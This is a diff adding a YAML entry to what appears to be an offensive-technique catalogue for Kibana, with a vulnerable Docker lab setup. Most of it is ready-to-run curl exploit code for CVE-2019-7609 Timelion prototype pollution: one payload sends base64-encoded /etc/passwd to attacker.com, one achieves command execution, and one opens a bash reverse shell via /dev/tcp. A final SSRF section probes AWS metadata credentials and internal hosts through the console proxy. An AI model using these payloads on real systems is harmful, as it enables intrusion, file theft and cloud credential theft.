@@ -1,0 +1,152 @@
+---
+comment: "Kibana is the Elasticsearch visualization and management frontend. Two exploitation\n\
+  paths are well-documented:\n\n1. CVE-2019-7609 (CVSS 8.1): Prototype pollution in\
+  \ the Timelion visualization parser\n   allows any authenticated user to set Node.js\
+  \ environment variables via the\n   __proto__.env chain. Setting NODE_OPTIONS=--require\
+  \ /proc/self/environ causes\n   a Kibana backend worker process to execute an attacker-controlled\
+  \ JavaScript\n   payload stored in a second polluted environment variable when it\
+  \ restarts.\n   Navigate to Canvas after setting the Timelion expression to trigger\
+  \ the worker restart.\n   Affects Kibana < 5.6.15 and < 6.6.1.\n\n2. Console proxy\
+  \ SSRF (authenticated): Kibana's Dev Tools console exposes\n   /api/console/proxy\
+  \ which forwards requests to Elasticsearch and optionally other\n   internal endpoints.\
+  \ No CVE \u2014 built-in feature available in all versions.\n"
+docker:
+  compose: "services:\n  elasticsearch:\n    image: docker.elastic.co/elasticsearch/elasticsearch:6.6.0\n\
+    \    environment:\n      - discovery.type=single-node\n      - xpack.security.enabled=false\n\
+    \    ports:\n      - \"9200:9200\"\n  kibana:\n    image: docker.elastic.co/kibana/kibana:6.6.0\n\
+    \    ports:\n      - \"5601:5601\"\n    environment:\n      ELASTICSEARCH_URL:\
+    \ http://elasticsearch:9200\n    depends_on:\n      - elasticsearch\n"
+  note: 'Starts Kibana 6.6.0 (vulnerable to CVE-2019-7609) connected to Elasticsearch
+    6.6.0.
+
+    Access Kibana at `http://localhost:5601`. No login required by default.
+
+    Navigate to Visualize > Create new visualization > Timelion to enter the payload.
+
+    After setting the Timelion expression, navigate to `/app/canvas` to trigger the
+    worker
+
+    restart. Run `docker compose up -d && sleep 30` before browsing.
+
+    '
+functions:
+  file-read:
+  - code: |
+      # CVE-2019-7609: read a file via Timelion prototype pollution (write output via curl)
+      # The payload reads /etc/passwd and sends it to the attacker's HTTP server
+      curl -s -X POST "http://victim.com:5601/api/timelion/run" \
+        -H "Content-Type: application/json" \
+        -H "kbn-xsrf: true" \
+        -d '{
+          "sheet": [".es(*).props(label.__proto__.env.AAAA='\''require(\"child_process\").exec(\"curl -s http://attacker.com:8888/?q=$(cat /etc/passwd|base64 -w0)\");//'\'').props(label.__proto__.env.NODE_OPTIONS='\''--require /proc/self/environ'\'')"],
+          "time": {"from":"now-1m","to":"now","interval":"auto","timezone":"UTC"}
+        }'
+      curl -s "http://victim.com:5601/app/canvas" -H "kbn-xsrf: true" > /dev/null
+      # Listen on the attacker machine: python3 -m http.server 8888
+      # Decode received base64: echo <base64> | base64 -d
+    comment: |
+      CVE-2019-7609: exfiltrates a file by base64-encoding it and sending it to an
+      attacker-controlled HTTP server via curl executed in the Node.js worker context.
+      Requires curl on the Kibana host and outbound HTTP access.
+      Alternatively, write the file content to /tmp/out.txt and retrieve it via
+      the reverse-shell entry.
+    contexts:
+      authenticated:
+    version: |
+      < 5.6.15 / < 6.6.1
+  rce:
+  - blind: false
+    code: "# CVE-2019-7609: prototype pollution via Timelion \u2192 Node.js worker\
+      \ RCE\n# Step 1: navigate to http://victim.com:5601/app/timelion and enter this\
+      \ expression:\n#\n# .es(*).props(label.__proto__.env.AAAA='require(\"child_process\"\
+      ).exec(\"id>/tmp/pwned\");//')\n# .props(label.__proto__.env.NODE_OPTIONS='--require\
+      \ /proc/self/environ')\n#\n# Step 2: click the Run button (the expression may\
+      \ return an error \u2014 that is expected)\n# Step 3: navigate to http://victim.com:5601/app/canvas\
+      \ to trigger the worker restart\n# The worker inherits the polluted environment\
+      \ and requires /proc/self/environ,\n# executing the AAAA variable value as JavaScript.\n\
+      #\n# Automated via curl (requires a valid session cookie / API key):\ncurl -s\
+      \ -X POST \"http://victim.com:5601/api/timelion/run\" \\\n  -H \"Content-Type:\
+      \ application/json\" \\\n  -H \"kbn-xsrf: true\" \\\n  -d '{\n    \"sheet\"\
+      : [\".es(*).props(label.__proto__.env.AAAA='\\''require(\\\"child_process\\\"\
+      ).exec(\\\"id>/tmp/pwned\\\");//'\\'').props(label.__proto__.env.NODE_OPTIONS='\\\
+      ''--require /proc/self/environ'\\'')\"],\n    \"time\": {\"from\":\"now-1m\"\
+      ,\"to\":\"now\",\"interval\":\"auto\",\"timezone\":\"UTC\"}\n  }'\n\n# Then\
+      \ trigger the canvas worker restart:\ncurl -s \"http://victim.com:5601/app/canvas\"\
+      \ -H \"kbn-xsrf: true\" > /dev/null\n"
+    comment: "CVE-2019-7609: the Timelion expression parser in Kibana uses a custom\
+      \ DSL that\nallows traversing JavaScript prototypes via .props(). Setting label.__proto__.env\n\
+      pollutes the environment of Node.js worker processes.\nNODE_OPTIONS=--require\
+      \ /proc/self/environ instructs Node to require /proc/self/environ\nas a module\
+      \ on next load. /proc/self/environ contains AAAA=<JS code>;//, which Node.js\n\
+      executes before encountering binary null bytes.\nCommand output goes to the\
+      \ target filesystem \u2014 confirm via a DNS/HTTP callback\nor use the reverse-shell\
+      \ entry for interactive access.\nRef: https://www.exploit-db.com/exploits/49784\n\
+      nuclei: CVE-2019-7609\n"
+    contexts:
+      authenticated:
+    version: |
+      < 5.6.15 / < 6.6.1
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2019-7609: reverse bash shell via Timelion prototype pollution
+      # Replace attacker.com and 12345 with your values, then URL-encode as needed.
+      # Step 1: set the Timelion expression (in the UI or via API):
+      LHOST="attacker.com"
+      LPORT="12345"
+      CMD="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
+
+      # Post the Timelion expression via the API:
+      curl -s -X POST "http://victim.com:5601/api/timelion/run" \
+        -H "Content-Type: application/json" \
+        -H "kbn-xsrf: true" \
+        -d "{
+          \"sheet\": [\".es(*).props(label.__proto__.env.AAAA='require(\\\"child_process\\\").exec(\\\"${CMD}\\\");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\"],
+          \"time\": {\"from\":\"now-1m\",\"to\":\"now\",\"interval\":\"auto\",\"timezone\":\"UTC\"}
+        }"
+
+      # Step 2: trigger the worker restart by visiting Canvas:
+      curl -s "http://victim.com:5601/app/canvas" -H "kbn-xsrf: true" > /dev/null
+    comment: "CVE-2019-7609: spawns a reverse bash shell via Timelion prototype pollution.\n\
+      The shell runs as the Kibana process user (commonly kibana or root in containers).\n\
+      The worker restart triggered by accessing Canvas executes the payload \u2014\
+      \ the HTTP\nresponse for the Canvas request does not indicate whether the shell\
+      \ fired.\nCheck the listener for the incoming connection within a few seconds.\n"
+    contexts:
+      authenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      < 5.6.15 / < 6.6.1
+  ssrf:
+  - code: |
+      # Dev Tools console proxy: forward HTTP requests to internal services
+      # The /api/console/proxy endpoint proxies GET/POST to Elasticsearch and internal hosts
+
+      # Probe AWS instance metadata (IMDSv1):
+      curl -s -X GET \
+        "http://victim.com:5601/api/console/proxy?path=http://169.254.169.254/latest/meta-data/iam/security-credentials/&method=GET" \
+        -H "kbn-xsrf: true" \
+        -H "Content-Type: application/json"
+
+      # Enumerate Elasticsearch indices (internal ES cluster):
+      curl -s -X GET \
+        "http://victim.com:5601/api/console/proxy?path=_cat/indices&method=GET" \
+        -H "kbn-xsrf: true"
+
+      # Probe an arbitrary internal HTTP service:
+      curl -s -X GET \
+        "http://victim.com:5601/api/console/proxy?path=http://10.0.0.1:8080/api/v1/&method=GET" \
+        -H "kbn-xsrf: true"
+    comment: "Kibana's Dev Tools console at /app/dev_tools exposes /api/console/proxy,\
+      \ which\nforwards HTTP requests server-side to the configured Elasticsearch\
+      \ host by default,\nbut in many versions also accepts arbitrary target URLs\
+      \ in the path parameter.\nThe full response body is returned inline in the API\
+      \ response \u2014 making this a\nfull-read SSRF primitive for any authenticated\
+      \ Kibana user.\nCloud metadata endpoints:\n- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
+      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    contexts:
+      authenticated:
+...
